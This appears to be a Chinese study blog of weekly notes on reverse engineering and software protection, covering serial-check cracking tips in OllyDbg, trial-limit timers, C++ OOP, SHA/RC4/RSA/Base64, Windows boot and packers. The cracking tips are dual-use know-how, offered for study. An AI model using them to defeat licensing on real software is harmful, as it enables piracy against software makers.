<h3 id="数据约束性"><a href="#数据约束性" class="headerlink" title="数据约束性"></a>数据约束性</h3><p>只用在明文比较注册码的保护方式中使用。大多数情况下，真正的注册码会在某个时刻出现在内存中，一般会在用户输入的 ±90h。<br>例如，用 od 按’Alt+M’打开内存窗口，’Ctrl+B’打开搜索框，搜索输入的序列号，可在附近查找到真序列号</p>
<h3 id="利用消息断点"><a href="#利用消息断点" class="headerlink" title="利用消息断点"></a>利用消息断点</h3><p>按下和释放鼠标时会发送 WM_LBUTTONDOWN 和 WM_LUBTTONUP 消息，用这个消息下断点可以找到按钮的事件代码</p>
<h3 id="利用提示信息"><a href="#利用提示信息" class="headerlink" title="利用提示信息"></a>利用提示信息</h3><p>当输入错时提示“序列号错误，再来一次”等，可以查找相应的字符串，定位到相关代码<br>如 od 中，右键“search for”-&gt;“all referenced text string”</p>
<h2 id="字符串比较形式"><a href="#字符串比较形式" class="headerlink" title="字符串比较形式"></a>字符串比较形式</h2><ol>
<li>寄存器直接比较</li>
<li>函数比较<br>比较内容放在寄存器或栈中<br>call 一个用于比较的函数，可能是 api 函数或自己写的</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">call ....</span><br><span class="line">test eax,eax</span><br><span class="line">jz   ....      ;zf&#x3D;1-&gt;eax&#x3D;0 跳转</span><br></pre></td></tr></table></figure>
<ol>
<li>串比较</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lea edi [   ] ;edi指向字符串a</span><br><span class="line">lea esi [   ] ;....</span><br><span class="line">repz cmpsd    ;比较</span><br></pre></td></tr></table></figure>
<p>edi、esi：变址寄存器，存放存储单元在段内的偏移量。<br>rep：按 ecx 中指定次数或在 zf 不满足条件前重复。<br>如果 ds:si 和 es:di 所指向的两个字节相等，则继续比较。REP（重复）、REPE（相等时重复）、REPNE（不相等时重复）、REPZ（为零时重复）及 REPNZ（不为零时重复）<br><img src="https://s1.ax1x.com/2020/04/02/GGvR3D.png" alt=" "><br>CMPSB 比较字节 CMPSW 比较字 CMPSD 比较双字 ,方向标志位决定 ESI 和 EDI 的增加或减少</p>
<h1 id="警告窗口"><a href="#警告窗口" class="headerlink" title="警告窗口"></a>警告窗口</h1><p>常用的方法是修改程序的资源、静态分析、动态分析<br>显示窗口的常用函数有 MessageBoxA(W)、MessageBoxExA(W)、DialogBoxParamA(W)、ShowWindow、CreateWindowExA(W)等，对某些警告窗口无效时可以尝试利用消息设置断点拦截</p>
<h1 id="时间限制"><a href="#时间限制" class="headerlink" title="时间限制"></a>时间限制</h1><h2 id="计时器"><a href="#计时器" class="headerlink" title="计时器"></a>计时器</h2><p>对于限制每次运行时长的软件</p>
<ol>
<li>setTimer 函数<br>应用程序在初始化时调用这个 api 函数，申请计时器并设定时间间隔，同时获得一个处理计时器超时的回调函数。若超时，系统会向申请的窗口发送 WM_TIMER 或调用那个回调函数。当程序不需要计时器，调用 KillTimer()进行销毁</li>
<li>高精度多媒体计时器<br>调用 timeSetEvent()</li>
<li>其它<br>timeGetTime()、GetTickCount()，返回的都是系统启动以来经历过的时间，函数的精度取决于系统的设置；也可以利用各高级语言开发库里的函数实现计时，如 c 语言里的 time()（返回 1970.01.01 0 时起至今的秒数）</li>
</ol>
<p>精度太高会对系统性能造成影响，故一般不需要太高精度。</p>
<h2 id="时间限制-1"><a href="#时间限制-1" class="headerlink" title="时间限制"></a>时间限制</h2><p>试用期<br>在安装软件或主程序第一次运行时获得系统日期并记录。程序每次运行都要去的当前系统日期并与之前的记录比较<br>软件一般最少要保存两个时间值，一个是安装（运行）日期（最好存在多个地方），一个是软件最近一次运行的日期（防止用户修改机器日期）<br>用于获取时间的 api 函数有 GetSystemTime、GetLocalTime、GetFileTime，即使不直接使用这些函数，高级语言中封装的类也调用了这些函数。<br>还有一种方法是读取需要频繁修改的系统文件，利用 FileTimeToSystem()</p>
<h1 id="面向对象（OOP）涉及到的几个名词"><a href="#面向对象（OOP）涉及到的几个名词" class="headerlink" title="面向对象（OOP）涉及到的几个名词"></a>面向对象（OOP）涉及到的几个名词</h1><p>主要是因为加密与解密里涉及到了（如虚函数）但不懂是啥．．．．</p>
<h2 id="类（class）-amp-对象"><a href="#类（class）-amp-对象" class="headerlink" title="类（class）&amp;对象"></a>类（class）&amp;对象</h2><p>类是用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例<br>当我们定义一个 class 的时候，我们实际上就定义了一种数据类型。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Box</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">      <span class="comment">// 构造函数定义</span></span><br><span class="line">      Box(<span class="keyword">double</span> l=<span class="number">2.0</span>, <span class="keyword">double</span> b=<span class="number">2.0</span>, <span class="keyword">double</span> h=<span class="number">2.0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt;<span class="string">"Constructor called."</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">         length = l;</span><br><span class="line">         breadth = b;</span><br><span class="line">         <span class="built_in">height</span> = h;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">double</span> <span class="title">Volume</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> length * breadth * <span class="built_in">height</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(Box box)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Volume() &gt; box.Volume();</span><br><span class="line">         <span class="comment">// 每一个对象都能通过this 指针访问自己的地址</span></span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">private</span>:             <span class="comment">//类成员的属性，还可为private 或 protected</span></span><br><span class="line">      <span class="keyword">double</span> length;   <span class="comment">// 盒子的长度</span></span><br><span class="line">      <span class="keyword">double</span> breadth;  <span class="comment">// 盒子的宽度</span></span><br><span class="line">      <span class="keyword">double</span> <span class="built_in">height</span>;   <span class="comment">// 盒子的高度</span></span><br><span class="line">&#125;;</span><br><span class="line">Box Box1;          <span class="comment">// 声明对象 Box1，类型为 Box</span></span><br><span class="line">Box Box2;          <span class="comment">// 声明对象 Box2，类型为 Box</span></span><br></pre></td></tr></table></figure>
<p>构造函数：实现对象初始化<br>析构函数：释放对象占用的内存空间<br>类的作用：安全、继承</p>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>面向对象程序设计中最重要的一个概念是继承。继承允许我们依据一个类来定义另一个类，这使得创建和维护一个应用程序变得更容易。这样做，也达到了重用代码功能和提高执行效率的效果。<br>当创建一个类时，您不需要重新编写新的数据成员和成员函数，只需指定新建的类继承了一个已有的类的成员即可。这个已有的类称为基类、父类或超类，新建的类称为派生类或子类。<br>继承代表了 is a 关系。例如，哺乳动物是动物，狗是哺乳动物。<br>如果一个实例的数据类型是某个子类，那么它的数据类型也可以看作是父类</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shape</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">void</span> <span class="title">setWidth</span><span class="params">(<span class="keyword">int</span> w)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="built_in">width</span> = w;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">void</span> <span class="title">setHeight</span><span class="params">(<span class="keyword">int</span> h)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="built_in">height</span> = h;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">protected</span>:</span><br><span class="line">      <span class="keyword">int</span> <span class="built_in">width</span>;</span><br><span class="line">      <span class="keyword">int</span> <span class="built_in">height</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PaintCost</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getCost</span><span class="params">(<span class="keyword">int</span> area)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> area * <span class="number">70</span>;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 派生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span>:</span> <span class="keyword">public</span> Shape</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getArea</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> (<span class="built_in">width</span> * <span class="built_in">height</span>);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//多继承，即一个子类可以有多个父类，它继承了多个父类的特性</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span>:</span> <span class="keyword">public</span> Shape, <span class="keyword">public</span> PaintCost</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getwhatever</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> (<span class="built_in">width</span> * <span class="built_in">height</span> *<span class="built_in">height</span>);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>多态按字面的意思就是多种形态。存在的必要条件：继承、重写（子类对父类的方法做一定修改）、父类引用指向子类的对象<br>当子类和父类都存在相同的方法时，子类覆盖了父类的方法</p>
<blockquote>
<p>对于一个变量，我们只需要知道它是 Animal 类型，无需确切地知道它的子类型，就可以放心地调用 run()方法，而具体调用的 run()方法是作用在 Animal、Dog、Cat 还是 Tortoise 对象上，由运行时该对象的确切类型决定，这就是多态真正的威力：调用方只管调用，不管细节，而当我们新增一种 Animal 的子类时，只要确保 run()方法编写正确，不用管原来的代码是如何调用的。<a href="https://www.liaoxuefeng.com/wiki/897692888725344/923030507728352" target="_blank" rel="noopener">继承和多态</a></p>
</blockquote>
<h2 id="虚函数-1"><a href="#虚函数-1" class="headerlink" title="虚函数"></a>虚函数</h2><p>C++中的虚函数的作用主要是实现了多态的机制。基类定义虚函数，子类可以重写该函数；在派生类中对基类定义的虚函数进行重写时，需要在派生类中声明该方法为虚方法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="comment">//这里的foo()也可以啥都不输出，即virtual void foo();</span></span></span><br><span class="line"><span class="function">    <span class="comment">//如果写为virtual void foo()=0 则为一个纯虚函数，仅提供一个接口，在继承时必须实现</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"A::foo() is called"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span><span class="keyword">public</span> A</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"B::foo() is called"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    A *a = <span class="keyword">new</span> B();</span><br><span class="line">    a-&gt;foo();   <span class="comment">// 在这里，a虽然是指向A的指针，但是被调用的函数(foo)却是B的!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>带有纯虚函数的类称为抽象类，只能作为基类，且不能定义对象（抽象类这边还涉及到了 abstract 和 virtual，但先不管了….）</p>
<h3 id="虚函数表"><a href="#虚函数表" class="headerlink" title="虚函数表"></a>虚函数表</h3><p>编译器处理虚函数的方法是：为每个类对象添加一个隐藏成员，隐藏成员中保存了一个指向函数地址数组的指针，称为虚表指针，这种数组成为虚函数表。即，每个类使用一个虚函数表，每个类对象用一个虚表指针。</p>
<h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>把数据和函数捆绑在一起。<br>通过创建类来进行封装和数据隐藏（public、protected、private）。默认情况下，类中定义的项目都是私有的，再提供对外 public 的接口</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adder</span>&#123;</span></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="comment">// 构造函数</span></span><br><span class="line">      Adder(<span class="keyword">int</span> i = <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        total = i;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 对外的接口</span></span><br><span class="line">      <span class="function"><span class="keyword">void</span> <span class="title">addNum</span><span class="params">(<span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          total += number;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 对外的接口</span></span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getTotal</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> total;</span><br><span class="line">      &#125;;</span><br><span class="line">   <span class="keyword">private</span>:</span><br><span class="line">      <span class="comment">// 对外隐藏的数据</span></span><br><span class="line">      <span class="keyword">int</span> total;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="python-爬虫学习"><a href="#python-爬虫学习" class="headerlink" title="python 爬虫学习"></a>python 爬虫学习</h1><p><a href="https://brubbish.github.io/710f8e5f.html#RE库的match对象">https://brubbish.github.io/710f8e5f.html#RE库的match对象</a></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.04.13-2020.04.19</title>
    <url>/32820.html</url>
    <content><![CDATA[<h1 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h1><h2 id="单向散列算法"><a href="#单向散列算法" class="headerlink" title="单向散列算法"></a>单向散列算法</h2><h3 id="SHA算法"><a href="#SHA算法" class="headerlink" title="SHA算法"></a>SHA算法</h3><p>安全散列算法，包括SHA-1,SHA-256,SHA-384,SHA-512,分别产生160位、256位、384位、512位散列值   </p>
<h4 id="SHA-1算法"><a href="#SHA-1算法" class="headerlink" title="SHA-1算法"></a>SHA-1算法</h4><p>原始消息长度不能超过2^64<br>sha-1算法与md4算法原理相同，消息分组和填充方式和md5算法相同(到md5的第二步)<br><a id="more"></a><br>sha-1初始散列值用5个32位双字进行初始化，如图：<br><img src="https://s1.ax1x.com/2020/04/14/GzwQKK.png" alt=" "><br>运算时使用到的常数：<br><img src="https://s1.ax1x.com/2020/04/14/GzwlDO.png" alt=" "><br>用以上两组数识别sha-1算法   </p>
<h2 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h2><p>加密和解密的密钥完全相同<br>安全性依赖于：</p>
<ol>
<li>加密算法足够强，无法根据密文直接获得原文  </li>
<li>密钥的秘密性  </li>
</ol>
<p>在使用时，把用户输入的注册码（或注册码的一部分等）作为算法的密钥。如果在检查注册码时把用户的输入作为算法的输出或输入，解密者都可以找到所用的密钥<br>常用的对称分组加密算法有：DES、IDEA、AES等   </p>
<p>对称密码分为：</p>
<ol>
<li>流密码：对每一个比特都作为基本处理单元进行加密</li>
<li>块密码（分组密码）：先分块，再对每一块进行加密<h3 id="RC4流密码"><a href="#RC4流密码" class="headerlink" title="RC4流密码"></a>RC4流密码</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4>生成一种伪随机流（称为密钥流），与长度相同的明文通过异或（相同为假，不同为真）操作进行加密；解密时也与密文进行异或操作<br>密钥流分为KSA和PRGA两部分   </li>
<li>KSA（the key-scheduling algorithm)   <ol>
<li>先对一个256字节的数组S进行初始化，按顺序填入0~255    </li>
<li>如果输入的密钥长度小于256字节，则按密钥的填充输入的密钥（如输入1，2，3，4，5，填为1，2，3，4，5，1，2，3，…  放入数组T</li>
<li>对1中数组元素做如下交换<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">        　j = <span class="number">0</span>;</span><br><span class="line">    　  　<span class="keyword">for</span> (i = <span class="number">0</span> ; i &lt; <span class="number">256</span> ; i++)&#123;</span><br><span class="line">      　　　　j = (j + S[i] + T[i]) mod <span class="number">256</span>;</span><br><span class="line">      　　　　swap(S[i] , S[j]);</span><br><span class="line">      　　&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
<ol>
<li>PRGA（the pseudo-random gerneration algorithm)<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(datalength--)&#123;<span class="comment">//明文长度datalength</span></span><br><span class="line">　　　i = (i + <span class="number">1</span>) mod <span class="number">256</span>;</span><br><span class="line">　　　　j = (j + S[i]) mod <span class="number">256</span>;</span><br><span class="line">　　　　swap(S[i] , S[j]);</span><br><span class="line">　　　　t = (S[i] + S[j]) mod <span class="number">256</span>;</span><br><span class="line">　　　　k = S[t];<span class="comment">//这里的K就是当前生成的一个秘钥流中的一位</span></span><br><span class="line">　　　　<span class="comment">//可以直接在这里进行加密，当然也可以将密钥流保存在数组中，最后进行异或</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="公开密钥加密算法"><a href="#公开密钥加密算法" class="headerlink" title="公开密钥加密算法"></a>公开密钥加密算法</h2><p>亦称非对称加密算法。在加密与解密时用不同的密钥，加密用的密钥叫做公钥，解密用的密钥叫做私钥<br>公开密钥的设计基于<a href="https://blog.csdn.net/qq_21768483/article/details/80430590" target="_blank" rel="noopener">NP完全问题</a>   </p>
<h3 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h3><p>算法的安全性依赖于大整数因式分解（主要是分解n），密钥位数越长就越安全</p>
<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><ol>
<li>选取两个较大素数p，q（用算法随机产生两个数，使用概率算法来验证是否质数。假如通过了这个测试的话，那么要使用一个精确的测试来保证的确是质数。）且pq不能太接近  </li>
<li>n=pq，n称为模  </li>
<li>计算欧拉函数φ(n)=(p-1)(q-1)  </li>
<li>选取加密密钥e，e常用值为3、7和（2^16+1)  </li>
<li>使用扩展欧几里得算法，求出d  </li>
<li>公钥为e和n；私钥为d；p，q必须保密  </li>
<li>把消息进行分组，每组长度比n小，将每组都根据公式进行加密的计算  </li>
<li>解密时，取每一个分组按公式进行解密</li>
</ol>
<h2 id="Base64算法"><a href="#Base64算法" class="headerlink" title="Base64算法"></a>Base64算法</h2><p>将二进制数据编码为字母和数字，用于非文本传输。使用ASCII（A~/)第65个字符为“=”），并用6个进制位表示一个可显示字符<br>编码时：</p>
<ol>
<li>将第一个字节放置于24位缓冲区的高8位，第二个字节放在中间的8位，第三个字节放在低8位（少于3个字节，相应的缓冲区置0）</li>
<li>对24位缓冲区以6位为一组作为索引，高位优先，从ASCII表取出对应数值的元素进行输出,置0的位置输出“=” </li>
</ol>
<p>如：对单词sky：<br><img src="https://s1.ax1x.com/2020/04/17/JZN1ER.png" alt=" "><br><img src="https://s1.ax1x.com/2020/04/17/JZdBVJ.jpg" alt=" "><br>再根据28-&gt;c;54-&gt;2;…..<br>得到sky对应的base64编码   </p>
<p>在url和cookie里“=”会造成歧义，因此很多base64编码在最后会把”=”去掉。<br>因为<strong>base64编码的长度永远是4的倍数</strong>，所以可以确定少了几个“=”   </p>
<h2 id="加密算法在软件保护的应用"><a href="#加密算法在软件保护的应用" class="headerlink" title="加密算法在软件保护的应用"></a>加密算法在软件保护的应用</h2><p>不仅包括软件的注册激活系统、软件的防逆向，还包括软件涉及的数据的安全保护，包括存储数据的加密和数据交换的加密协议，如聊天软件的加密协议、游戏客户端与服务器通信的协议包、智能硬件和app通信的命令协议等<br>高等难度级别的保护方案可以设计得简单也可以复杂：<br>简单：例如对用户名处理时把哈希、对称、公钥算法全都用上，或者用难以分析的算法例如ecdsa。流程很简单但破解门槛很高<br>复杂：可以使用不常见的算法（没有特征）、使用自己的算法，如果用公开的算法库，要去掉一些特征字符串，从而识别不出用了哪个算法库   </p>
<h1 id="Windows内核"><a href="#Windows内核" class="headerlink" title="Windows内核"></a>Windows内核</h1><p>操作系统一般分为应用层和内核层，应用层通过系统调用进入内核，由系统底层完成相应功能；内核处理某些硬件发来的中断请求，代替硬件完成某些功能</p>
<h2 id="内核理论基础"><a href="#内核理论基础" class="headerlink" title="内核理论基础"></a>内核理论基础</h2><h3 id="权限级别"><a href="#权限级别" class="headerlink" title="权限级别"></a>权限级别</h3><p>cpu的运行级别依次为R0（最高执行权限）、R1、R2、R3（最低执行权限），r0运行内核，r1、r2运行设备驱动，r3运行应用程序。为了让工作变得简单，现在cpu和操作系统只保留了r0和r3，驱动运行在r0级    </p>
<h3 id="内存空间布局"><a href="#内存空间布局" class="headerlink" title="内存空间布局"></a>内存空间布局</h3><p>32位寻址支持2^32B（4GB）的虚拟内存空间，其中系统的内存主要分为内核空间和应用层空间，每部分约占2GB，还有64kb的null空间和非法区域<br>64位理论支持最大2^64kb的寻址空间，但因为太大用不完所以只支持到40多位（….顺便32位和64位cpu地址总线不一定是32/64，32位通过PAE扩展到36位；64位只有4x位）    </p>
<h3 id="Windows启动过程"><a href="#Windows启动过程" class="headerlink" title="Windows启动过程"></a>Windows启动过程</h3><ol>
<li>自检<br>从bios载入指令，进行硬件的初始化检查  </li>
<li>初始化启动<br>根据cmos的设置，bios加载启动盘，将主引导记录（mbr）[1]中的引导代码载入内存。启动代码搜索mbr中的分区表,找出活动分区，将引导代码载入内存。引导代码查找并启动ntldr文件，bios将控制权转移给ntldr   </li>
<li>boot加载   <ol>
<li>设置内存模式</li>
<li>启动文件系统，定位boot.ini等启动文件</li>
<li>读取boot.ini </li>
</ol>
</li>
<li>检测和配置硬件<br>检查和配置硬件设备如系统固件、适配器、输入设备等</li>
<li>内核加载<ol>
<li>加载系统内核的ntoskrnl.exe[2]和硬件抽象层（HAL,内核与硬件电路之间的接口层)。</li>
<li>从注册表读取安装的驱动程序，然后依次加载</li>
</ol>
</li>
<li>Windows会话管理启动<br>会话管理器程序：smss.exe，是系统第一个创建的用户模式进程  </li>
<li>用户登录<br>由winlogon.exe系统服务提供，完成：  <ol>
<li>启动服务子系统，即服务控制管理器</li>
<li>启动本地安全授权过程</li>
<li>显示登录界面</li>
</ol>
</li>
</ol>
<p>用bios和mbr的启动方式具有局限性，新的系统引导方式用UEFI和GPT。<br>UEFI（统一的可扩展固件接口）突破了读取分区容量最高仅为2tb的限制；并且UEFI本身相当于一个微型操作系统，可以直接读取FAT分区中的文件，程序员可以开发出直接在UEFI下运行的程序。因此可以将Windows安装程序做成efi类型的应用程序，从而不需要主引导记录、活动分区等，就可以启动Windows<br>GPT（全局唯一标识分区表）可以对分区数量没有限制（Windows限制在128个以内），可管理磁盘大小为18eb，只有基于uefi平台的主板才支持gpt分区引导启动</p>
<p>[1]: Master Boot Record，包括启动代码、硬盘分区表、结束标志字，包含MBR引导代码的扇区称为主引导扇区<br>[2]: Windows NT operating system kernel,为内核空间提供内核和执行层，并负责一些系统服务</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.05.18-2020.05.25</title>
    <url>/33337.html</url>
    <content><![CDATA[<p>从上周开始不用写周报了<br>感觉没有监督就懒散了23333   </p>
<h1 id="壳"><a href="#壳" class="headerlink" title="壳"></a>壳</h1><p>附加在原始程序上，通过windows加载器载入内存后，先于原始程序执行，在执行过程中对原始程序进行解密、还原，还原后把控制权还给原始程序，执行原来的代码。可以防止程序文件被非法修改或者静态反编译<br>许多木马和病毒都喜欢用壳来保护和隐藏自己。对一些流行的壳，杀毒引擎先对目标软件进行脱壳，再进行病毒检查；对大多数私人壳，杀毒软件不会开发解压引擎，而是直接当成木马或病毒处理，因此，商业软件出于兼容性的考虑，很少使用加壳保护，而在其他方面提高软件保护强度<br>不同的外壳侧重方面不一样，有的侧重压缩，有的侧重加密，还有一些提供额外的功能，如注册机制、使用次数、时间限制等<br><a id="more"></a></p>
<h2 id="压缩引擎"><a href="#压缩引擎" class="headerlink" title="压缩引擎"></a>压缩引擎</h2><p>一些加壳软件调用现成的压缩引擎对文件进行压缩，在选择压缩引擎时要保证解压速度快，这样加了壳的文件运行速度才不会受到太大影响</p>
<h3 id="压缩壳"><a href="#压缩壳" class="headerlink" title="压缩壳"></a>压缩壳</h3><ol>
<li>upx</li>
<li>ASPack<h3 id="加密壳"><a href="#加密壳" class="headerlink" title="加密壳"></a>加密壳</h3></li>
<li>ASProtect</li>
<li>Armadillo</li>
<li>EXECryptor</li>
<li>Themida</li>
</ol>
<h1 id="虚拟机保护"><a href="#虚拟机保护" class="headerlink" title="虚拟机保护"></a>虚拟机保护</h1><p>许多解释性的语言，如java的jvm。这里讨论的虚拟机（与vmware不同）将一系列指令解释成字节码后放在一个解释引擎中执行，从而对软件进行保护。  </p>
<h2 id="虚拟机引擎"><a href="#虚拟机引擎" class="headerlink" title="虚拟机引擎"></a>虚拟机引擎</h2><p>一个虚拟机引擎由编译器、解释器和虚拟cpu组成，还会搭配一个或多个指令系统。虚拟机在运行时，现根据自定义的指令系统把已知的指令解释成字节码并放在pe文件中，然后将原始代码删除，改成直接进入虚拟机执行。<br>挑事者跟踪并进入虚拟机后很难理解原始指令。想要理解程序就必须对虚拟机引擎进行分析<br>虚拟机技术以效率换取安全，一条指令经过虚拟机处理，体积会膨胀几十几百倍。因此，VM保护通常经过sdk方式，只把较为重要的代码保护起来</p>
<h1 id="c"><a href="#c" class="headerlink" title="c++"></a>c++</h1><h2 id="输入和输出"><a href="#输入和输出" class="headerlink" title="输入和输出"></a>输入和输出</h2><p>可以用scanf和printf，也可用c++中增加的输入输出库<br>如果要使用输入输出时，需要包含头文件：<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br></pre></td></tr></table></figure><br>使用cin和count进行输入和输出<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;x;<span class="comment">//多输出：cin&gt;&gt;x&gt;&gt;y;</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"The int number is x= "</span>&lt;&lt;x&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//endl即end of line 表示结尾进行换行</span></span><br></pre></td></tr></table></figure><br>cin和count这两个运算符可以自行分析处理（强制转换）数据类型，因此无需像使用scanf和printf那样给出格式控制字符串。</p>
<h2 id="new和delete"><a href="#new和delete" class="headerlink" title="new和delete"></a>new和delete</h2><p>用来动态分配内存和释放内存<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> *p = <span class="keyword">new</span> <span class="keyword">int</span>;  <span class="comment">//分配1个int型的内存空间</span></span><br><span class="line"><span class="keyword">delete</span> p;  <span class="comment">//释放内存</span></span><br><span class="line"><span class="comment">//以及</span></span><br><span class="line"><span class="keyword">int</span> *p = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];  <span class="comment">//分配10个int型的内存空间</span></span><br><span class="line"><span class="keyword">delete</span>[] p;</span><br></pre></td></tr></table></figure></p>
<h2 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h2><p>类只是一种数据类型，本身并不占用空间</p>
